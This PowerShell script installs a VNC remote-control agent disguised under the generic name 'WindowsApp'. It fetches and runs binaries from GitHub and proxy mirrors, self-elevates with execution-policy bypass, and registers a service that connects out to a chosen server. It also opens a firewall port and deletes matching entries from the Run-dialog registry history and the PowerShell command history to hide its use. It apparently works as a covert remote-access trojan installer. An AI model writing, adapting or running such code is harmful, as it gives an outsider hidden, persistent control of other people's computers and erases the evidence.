param(
    [Parameter(Mandatory=$true)][string]$h,   # server_host
    [Parameter(Mandatory=$true)][string]$p,   # server_port
    [Parameter(Mandatory=$true)][string]$v,   # view-only password (8 chars)
    [Parameter(Mandatory=$true)][string]$c,   # control password (8 chars)
    [string]$b = 'https://ghfast.top/https://raw.githubusercontent.com/309804/1/gh-pages/1.4.19share'  # mirror base url (optional)
)

# WindowsApp one-shot bootstrap. This file contains NO secrets:
# server/password values are passed on the command line and written only
# into the encrypted WindowsApp.ini on the local machine.

$ErrorActionPreference = 'Stop'
$localPs1 = $null

# PS 5.1 on some Server images defaults to TLS 1.0; GitHub raw requires TLS 1.2.
# Invoke-WebRequest then fails with "The underlying connection was closed".
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

# Mirror fallbacks. GitHub links can be reset intermittently per-network, so:
#   - caller's -b first, then several independent mirrors (Pages / CDN / raw)
#   - each mirror retried several times (curl --retry handles TLS resets)
# No single mirror works everywhere: keep them all and rotate.
$mirrors = @($b) + @(
    'https://309804.github.io/1/1.4.19share',
    'https://raw.githubusercontent.com/309804/1/gh-pages/1.4.19share',
    'https://ghfast.top/https://raw.githubusercontent.com/309804/1/gh-pages/1.4.19share',
    'https://gh-proxy.com/https://raw.githubusercontent.com/309804/1/gh-pages/1.4.19share'
) | Where-Object { $_ } | Select-Object -Unique

function Save-FromMirror {
    param([string]$Name, [string]$Dest)
    foreach ($m in $mirrors) {
        $url = $m.TrimEnd('/') + '/' + $Name
        # 1) curl.exe: own TLS stack, -f rejects cached error pages,
        #    --retry absorbs intermittent connection resets / TLS failures.
        try {
            & curl.exe -fsSL --retry 5 --retry-delay 1 --retry-connrefused `
                --connect-timeout 8 --max-time 60 -o $Dest $url 2>$null
            if (($LASTEXITCODE -eq 0) -and (Test-Path -LiteralPath $Dest) -and ((Get-Item -LiteralPath $Dest).Length -gt 100)) { return }
        } catch {}
        # 2) Invoke-WebRequest fallback (TLS 1.2 forced above).
        try {
            Invoke-WebRequest -Uri $url -OutFile $Dest -UseBasicParsing -TimeoutSec 30
            if ((Test-Path -LiteralPath $Dest) -and ((Get-Item -LiteralPath $Dest).Length -gt 100)) { return }
        } catch {}
    }
    throw "FAILED to download $Name from all mirrors"
}

# --- erase traces of the plaintext passwords typed in the Win+R command ---
# Win+R stores the full command (with -h/-p/-v/-c values) in the registry
# RunMRU key. Remove only entries that reference this bootstrap, keep the
# user's other history, and repair the MRUList index.
try {
    $mru = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
    if (Test-Path -LiteralPath $mru) {
        $k = Get-ItemProperty -LiteralPath $mru
        $drop = @()
        foreach ($n in $k.PSObject.Properties.Name) {
            if ($n -like 'PS*' -or $n -eq 'MRUList') { continue }
            $val = [string]$k.$n
            if ($val -match 'wa_setup|309804|1\.4\.19share') { $drop += $n }
        }
        foreach ($n in $drop) {
            Remove-ItemProperty -LiteralPath $mru -Name $n -Force -ErrorAction SilentlyContinue
        }
        if ($drop.Count -gt 0) {
            $list = [string]$k.MRUList
            foreach ($n in $drop) { $list = $list.Replace($n, '') }
            Set-ItemProperty -LiteralPath $mru -Name MRUList -Value $list -Force -ErrorAction SilentlyContinue
        }
    }
} catch {}

# PSReadLine may also persist the command; drop matching lines from its history file.
try {
    $hist = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($hist -and (Test-Path -LiteralPath $hist)) {
        $kept = Get-Content -LiteralPath $hist -ErrorAction SilentlyContinue |
                Where-Object { $_ -notmatch 'wa_setup|309804|1\.4\.19share' }
        $kept | Set-Content -LiteralPath $hist -Encoding UTF8 -ErrorAction SilentlyContinue
    }
} catch {}

function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
}

# self-elevate: download a local copy, then relaunch elevated with same params
if (-not (Test-Admin)) {
    $localPs1 = Join-Path $env:TEMP 'wa419_setup.ps1'
    Save-FromMirror 'setup.ps1' $localPs1
    $a = "-nop -ep bypass -f `"$localPs1`" -h '$h' -p '$p' -v '$v' -c '$c' -b '$b'"
    Start-Process -FilePath powershell -Verb RunAs -ArgumentList $a | Out-Null
    exit 0
}

$work = Join-Path $env:TEMP 'wa419'
New-Item -ItemType Directory -Force -Path $work | Out-Null

$w = 'WindowsApp'
# Core files + VC++ runtime DLLs. Strip-down Windows images (Server Core,
# LTSC, slim builds) often lack the VC++ Redistributable that WindowsApp.exe
# needs (msvcp140.dll / vcruntime140.dll / vcruntime140_1.dll). Ship them
# next to the exe so it runs self-contained, with no separate redist install.
$runtimeDlls = @(
    'msvcp140.dll', 'msvcp140_1.dll', 'msvcp140_2.dll',
    'msvcp140_atomic_wait.dll', 'msvcp140_codecvt_ids.dll',
    'vcruntime140.dll', 'vcruntime140_1.dll', 'concrt140.dll'
)
# Dynamic detection: only download/bundle runtime DLLs when the system is
# actually missing them. Normal Windows already ships VC++ 2015-2022 in
# System32; slim images (Server Core / LTSC / Ghost builds) do not.
# Check System32 for the 3 DLLs WindowsApp.exe imports directly.
$sysDir = [Environment]::SystemDirectory
$missingRt = @($runtimeDlls | Where-Object { -not (Test-Path -LiteralPath (Join-Path $sysDir $_)) })
$needRuntime = ($missingRt.Count -gt 0)
if ($needRuntime) {
    Write-Host ("VC++ runtime missing in system (" + $missingRt.Count + " dlls) - downloading bundled copies")
} else {
    Write-Host 'VC++ runtime already present in system - skipping runtime DLL download'
}
$downloadList = @(($w + '.exe'), ($w + '.dll'), ($w + '.ini'))
if ($needRuntime) { $downloadList += $runtimeDlls }
foreach ($f in $downloadList) {
    Save-FromMirror $f (Join-Path $work $f)
}
$exe = Join-Path $work 'WindowsApp.exe'

# build plaintext ini from params, then encrypt via exe's built-in tool
$lines = @(
    '[service]',
    'fallback_poll_ms=3600000',
    'poll_interval_ms=2000',
    'restart.delay_ms=3000',
    'restart.max_count=0',
    '',
    '[vnc]',
    'port=5858',
    ('password=' + $c),
    ('view_only_password=' + $v),
    'update_interval_ms=100',
    'desktop_name=WindowsApp',
    '',
    '[agent]',
    'enabled=1',
    ('server_host=' + $h),
    ('server_port=' + $p),
    'use_tls=1',
    'vnc_port=5858',
    'reconnect_delay=10',
    'service_name=WindowsApp'
)
$plain = Join-Path $work 'plain.ini'
[IO.File]::WriteAllLines($plain, $lines)

& $exe encrypt-ini $plain (Join-Path $work 'WindowsApp.ini')
if ($LASTEXITCODE -ne 0) { throw 'encrypt-ini failed' }
Remove-Item -LiteralPath $plain -Force -ErrorAction SilentlyContinue
Write-Host '--- generated config ---'
& $exe check-ini (Join-Path $work 'WindowsApp.ini')

# install: stop old, copy, install + start, firewall
$target = 'C:\Program Files\WindowsApp'
& $exe stop 2>$null | Out-Null
& $exe uninstall 2>$null | Out-Null
New-Item -ItemType Directory -Force -Path $target | Out-Null
Copy-Item (Join-Path $work 'WindowsApp.exe'), (Join-Path $work 'WindowsApp.dll'), (Join-Path $work 'WindowsApp.ini') -Destination $target -Force
# Only place runtime DLLs beside the exe when the system is missing them.
# When the system has them, prefer the OS copies and clear any stale bundled
# ones from a previous install so an outdated DLL never shadows System32.
if ($needRuntime) {
    $shippedDlls = Get-ChildItem -LiteralPath $work -Filter '*.dll' -File |
                   Where-Object { $_.Name -match '^(msvcp|vcruntime|concrt)' }
    if ($shippedDlls) { $shippedDlls | Copy-Item -Destination $target -Force }
    Write-Host ("copied " + @($shippedDlls).Count + " VC++ runtime DLL(s) to " + $target)
} else {
    foreach ($d in $runtimeDlls) {
        Remove-Item -LiteralPath (Join-Path $target $d) -Force -ErrorAction SilentlyContinue
    }
    Write-Host 'system runtime OK - no bundled DLLs placed in install dir'
}
$tExe = Join-Path $target 'WindowsApp.exe'
& $tExe install (Join-Path $target 'WindowsApp.ini')
& $tExe start
netsh advfirewall firewall delete rule name='WindowsApp 5858' 2>$null | Out-Null
netsh advfirewall firewall add rule name='WindowsApp 5858' dir=in action=allow protocol=TCP localport=5858 | Out-Null

# remove temp working files (downloaded placeholder ini + local script copy)
Remove-Item -LiteralPath (Join-Path $work 'WindowsApp.ini') -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath (Join-Path $work 'WindowsApp.exe') -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath (Join-Path $work 'WindowsApp.dll') -Force -ErrorAction SilentlyContinue
Get-ChildItem -LiteralPath $work -Filter '*.dll' -File -EA SilentlyContinue |
    Where-Object { $_.Name -match '^(msvcp|vcruntime|concrt)' } |
    Remove-Item -Force -EA SilentlyContinue
# $localPs1 is only set on the non-elevated self-elevating path.
# When already running as admin it stays $null, and Remove-Item -LiteralPath $null
# throws a parameter-binding error that -ErrorAction SilentlyContinue cannot suppress.
if ($localPs1) { Remove-Item -LiteralPath $localPs1 -Force -ErrorAction SilentlyContinue }
Write-Host 'DONE. WindowsApp installed and started. Traces cleared.'
